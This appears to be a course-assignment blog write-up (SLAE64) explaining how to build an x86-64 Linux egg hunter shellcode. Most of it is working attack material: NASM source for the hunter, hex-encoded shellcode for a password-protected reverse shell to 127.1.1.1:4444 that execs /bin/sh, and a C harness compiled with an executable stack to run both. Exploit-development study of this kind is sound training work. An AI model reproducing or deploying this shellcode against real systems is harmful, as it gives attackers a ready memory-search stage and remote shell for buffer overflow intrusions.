## Egg Hunter Shellcode
---
---
### Introduction
---
The objective of this assignment is to create an Egg Hunter Shellcode. For that is required to:

- Research and study about Egg Hunter Shellcode
- Create a working demo of the Egg Hunter
- The demo has to be easily configurable for different payloads

A must read paper, that came during the research, is [**_Safely Searching Process Virtual Address Space_**](http://www.orkspace.net/secdocs/Other/Misc/Safely%20Searching%20Process%20Virtual%20Address%20Space.pdf) from **_skape_**. It describes what a Egg Hunter is, the requirements for it to safely do it’s job, and ways to search in memory for that Egg. 

### What's an Egg Hunter Shellcode
---
When we want to exploit a buffer overflow vulnerability injecting shellcode to it, we can find out, that the space remaining in the buffer is too small to place our entire shellcode. 

Here is when the Egg Hunter Technique comes in place: An Egg is placed at the begining of the shellcode that we want to execute in the victim, and inject it along with a shellcode defining the instructions to find that Egg in memory. Once the Egg is found, execution is passed to the shellcode, placed just after the Egg. 

### Requirements of the Egg Hunter Shellcode 
---
The Egg Hunter Shellcode will have to search in the Virtual Address Space for the Egg. As searching in the VAS is a dangerous process, an Egg Hunter Shellcode must have the following requirements: 

- It must be robust. The Egg Hunter must be able to do searches anywhere in memory, also in invalid regions, without crashing 
- Must be small as the Egg Hunter payload must fit into very small amount of memory. Considering it’s size is very important  
- The Egg Hunter code must be fast to avoid iddle times during the search of the Egg in memory 

### Egg Hunter Implementation
---
In the paper, the autor mentions diferent techniques to search in memory using `sys_access`. This is the solution that is going to be implemented here.

Some considerations to have in mind: 

- With `sys_access`, instead of using a pathname to the function parameter, a memory address can be used to check if that memory position has been allocated. If it’s not allocated, the syscall will return an **`EFAULT`** error code. If this is the case, there is no need to search on this memory address, as is not allocated for the process. The call requires two parameters: (1) The `pathname`, that's the memory position to check, and (2) `mode`, that will be **`F_OK`** just to check if the position is there. 
```c
int access (const char * pathname, int mode); 
```
- Memory positions are agrupated into pages. This makes the search in memory with `sys_access` shorter, as if the syscall tries to access a position of memory not allocated, the whole page where this memory position belongs to, won’t be accesible. Hence, only is needed to check one memory position for each memory page.  

- To reduce false positives in the Egg search, Egg needs to be repeated twice. For example, a false positive could be the Egg Hunter shellcode finding itself as contains the Egg. For that, a 4 bytes Egg used twice is used.

All this said, the Egg Hunter Shellcode has to do the following: 
- Check memory pages if they are accesible 
- If the memory page is accessible, then search on each memory position of that page for the Egg
- If the Egg is found in memory, check next memory position if also has the Egg (2 consecutive memory positions) 
- If both Eggs found, then jump to execute the shellcode that will be after the two Eggs

The summarized pseudocode will be: 
```markdown
while (remain memory pages to check){ 
  if ( memory_page_is_accessible(first_memory_position_of_the_page) ) { 
    i = 0; 
    if (memory_position[i] == “EGG”) { 
        if (memory_position[i+1] == “EGG”) { 
            EGG_FOUND; 
            JMP_to_run(memory_position[i+2]; 
        } 
    } else { 
      i++; 
    } 
  } else { 
    go_to_check_next_memory_page; 
  } 
} 
```
The memory page size is usually 4096 bytes (hex value of: `0x1000`). This value is required to know in the Egg Hunter how many memory positions to search for each page. To check this value, the following code in C will show the size of the pages:
```c
#include <stdio.h>
#include <unistd.h>

void main(void)
{
        int size = getpagesize();
        printf("\nPage size on this system is %i bytes\n", size);
}
```
### ASM Implementation
---
Following is taken into consideration during the implementation:

- The value for the Egg is **"kaki"**. This can be easily changed in the code. 
- **RDX** will point to the memory address to check:
  - It's used to check each memory position of for a page in the search of the Egg in that page. It's value increments by "1" to check each memory position until it finds the Egg or reaches the end of the page.
  - The register also can be used to reference the memory page. For that, the code makes **RDX** to point at the first byte of each page. This is done by OR'ing the **RDX** value with `0x1000` (page size). Result of the Or will always point to the first byte of the next page to check.
    - As the value `0x1000` will place NULLs in the codee for the `or` instruction, the trick is to first `or rdx, 0x0FFF` (4095 in dec) and then `inc rdx`. This gives same results but without NULLs.
- **RDI** stores the memory position that is being checked plus 8 bytes, that is where the shellcode will be if the Egg is found in the RDX memory position. As the Egg is only 4 bytes, and per the comments before, the Egg has to be found twice, the total size of the Eggx2 is 8 bytes. After the Eggs, the shellcode starts.
- `sys_access` requires two parameters:
  - **RDI**: The memory position to check if its mapped to the process, and hence accesible by it
  - **RSI**: Value will be **`F_OK`**
- While a memory page mapped for the process is not found, a bucle will be incrementing the value of **RDX** by `0x1000` (page size) until `sys_access` finds that the page is accessible. From here, **RDX** is used to check each memory position in the page for the Egg.
- Once the Egg is found, have to check the next 4 bytes to see if also they contain the Egg. If both Eggs been found, then the code jumps to memory position where the found shellcode is to run it. **RDI** is pointing to this memory position as per the explanation before. Also doing this, we can use any value for the Egg, not requiring it to be opcodes for real ASM instructions

The following code implements the Egg Hunter Shellcode. The code does not remove NULLs at this time, it will be done later.
```asm
global _start
section .text

EGG equ 'kaki'

_start:

	xor rdx, rdx

next_mem_page:

	or dx, 0xfff		        ; 0xfff == 4095. To jump next page

next_mem_position:

	inc rdx			        ; Two uses: 
      				        ; 	1) Next memory position when checking memory positions into a page
			                ;	2) Place pointer at the first byte of a memory page
	lea rdi, [rdx + 8]	        ; Stores memory position after the "eggs" 

	mov rax, 0x15		        ; Syscall number for access()
	xor rsi, rsi
	syscall		            	; Test if mem position is accessible
				                  ;   RDI -> Address to check
				                  ;   RSI -> 0
	cmp rax, 0xf2		        ; EFAULT?
	jz next_mem_page	        ; Yes, then check next page

	mov rax, EGG	        	; Page accessible, let's check if we find the egg
	mov rdi, rdx	        	; Put in RDI the memory position to check if has the egg 
	scasd			        ; We compare. scasd increments RDI
	jnz next_mem_position	        ; Not found the egg, jump to next memory position in the page
	scasd			        ; Found 4 bytes of the egg, let's check if next 4 byte also have the egg
	jnz next_mem_position	        ; Not found second egg, jump again to check next memory position
	
	jmp rdi			        ; EGG found. Jump to execute it's shellcode. 
				        ; The RDI already pointing to the start of the shellcode due scasd increments
```
#### NULLs Off and Shellcode Size
For the ASM code, it's time now to remove the NULLs and try to reduce it's shellcode size as much as possible. The process will be the same one done in previous assignments:
- Use `objdump -M intel -d EggHunter.o` to review NULLs and opcodes
- Replace instructions with ones that do the same but that do not add NULLs
- Replace instructions, if possible, by ones using less bytes in the opcodes
- Hardcode the EGG value in the code

The code ends up like this. This time has not been reduced too much:
```asm
global _start
section .text
_start:

	xor rdx, rdx		      ; Pointer to memory positions

next_mem_page:

	or dx, 0xfff		      ; 0xfff == 4095. To jump next page

next_mem_position:

	inc rdx			      ; Two uses: 
				      ;   1) Next memory position when checking memory positions into a page
				      ;	  2) Place pointer at the first byte of a memory page
	lea rdi, [rdx + 8]	      ; Shellcode position

	;mov rax, 0x15		      ; Syscall number for access()
	push 21
	pop rax
	xor rsi, rsi
	syscall			      ; Test if memory position is accessible
				      ;   RDI -> Address to check
				      ;   RSI -> 0
	cmp al, 0xf2		      ; EFAULT?
	jz next_mem_page	      ; Yes, then check next page

	;mov rax, EGG		      ; Page accessible, let's check if we find the egg
	push "kaki"		      ; This is the egg value. 4 bytes. Change here
	pop rax

	;mov rdi, rdx		      ; Put in RDI the memory position to check if has the egg 
	push rdx
	pop rdi

	scasd			      ; We compare. scasd increments RDI
	jnz next_mem_position	      ; Not found the egg, jump to next memory position in the page
	scasd			      ; Found 4 bytes of the egg, let's check if next 4 byte also have the egg
	jnz next_mem_position	      ; Not found second egg, jump again to check next memory position
	
	jmp rdi			      ; EGG found. Jump to execute it's shellcode. 
			              ; The RDI already pointing to the start of the shellcode due scasd increments
```
### The PoC Code
---
For the demo of the Egg Hunter Technique, the `shellcode.c` template is used. Just some extra information is going to be printed this time:
- Length of the Egg Hunter Shellcode
- Length of the shellcode to find and execute
- Memory positions for both Shellcodes
With this information, memory positions where the shellcodes are is known. This will be usefull in the next steps.

Now, the shellcode for the Egg Hunter is generated with one liner `objdump`:
```markdown
SLAE64> echo “\"$(objdump -d EggHunterV2.o | grep '[0-9a-f]:' | 
              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""

"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58\x48\x31\xf6\x0f
\x05\x3c\xf2\x74\xe8\x68\x6b\x61\x6b\x69\x58\x52\x5f\xaf\x75\xe2\xaf\x75\xdf\xff\xe7"

SLAE64> 
```
Also, the shellcode that is used is the one from the [Assignment #2](https://galminyana.github.io/Assignment02):
```markdown
SLAE64> nasm -f elf64 ReverseShell-ExecveStack_V2.nasm -o ReverseShell-ExecveStack_V2.o
SLAE64> echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
              
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66
\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21
\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20
\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31
\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f
\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05"

SLAE64> 
```
Both shellcodes are populated into the `shellcode.c` template:
```c
#include <stdio.h>
#include <string.h>

//#define EGG	"\x90\x50\x90\x50"
#define EGG	"kaki"

unsigned char egg_hunter[] = \
"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58"
"\x48\x31\xf6\x0f\x05\x3c\xf2\x74\xe8\x68\x6b\x61\x6b\x69\x58\x52\x5f\xaf"
"\x75\xe2\xaf\x75\xdf\xff\xe7";

unsigned char code[]= EGG EGG \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01"
"\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f"
"\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49"
"\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05"
"\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37"
"\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

void main()
{
	printf("ShellCode Lenght + Eggs: %d\n", strlen(code));
	printf("Shellcode at position: %p\n", code);
	printf("Egg Hunter ShellCode Size: %d\n", strlen(egg_hunter));
	printf("Egg Hunter Shellcode at position: %p\n", egg_hunter);

	int (*ret)() = (int(*)())egg_hunter;
	ret();
}
```
#### Compiling and Run
When the program was compiled with the `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` command, and run, it will take too long to find the shellcode. This is because the Hunter code, will start from the 1st lower memory position, and the program will be far from there. 
Just for the POC, we can compile with gcc forcing the .text sextion to be in low memory positions to make the find process easier. This is done with the following gcc options:
```markup
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode -Wl,-Ttext-segment,0x20000000
```
Once compiled with this options, the "egg" is found quickly. To test it, a `netcat` listener on port 4444 is needed on one terminal, and in the other terminal, `./shellcode` is executed. Everything works great, spawning a shell:

<img src="https://galminyana.github.io/img/A03_POC_Results.png" width="75%" height="75%">

#### Setting the POC for any shellcode

If another shellcode has to be tested, just need to replace the shellcode in `code[]` string in the `shellcode.c` and compile.
In case that another Egg value has to be used, also needs to be replaced in the `EGG` defined in the `shellcode.c` and also in the ASM code where it is hardcoded (it's commented in the code).

### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment03) for this assignment contains the following files:

- [EggHunter.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/EggHunter.nasm) : This is the ASM source code for the first version of the Egg Hunter. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
- [EggHunterV2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/EggHunterV2.nasm) : This is the NULL free code for the Egg Hunter.
- [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment03/ReverseShell-ExecveStack_V2.nasm) : This is the NULL free code for the Egg Hunter.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment03/shellcode.c) : The C template with the V2 of the Egg Hunter Shellcode and ReverseShell Shellcode, ready to compile and execute
- [pagesize.c](https://github.com/galminyana/SLAE64/blob/main/Assignment03/pagesize.c) : A C program that just prints the size of memory pages in the system

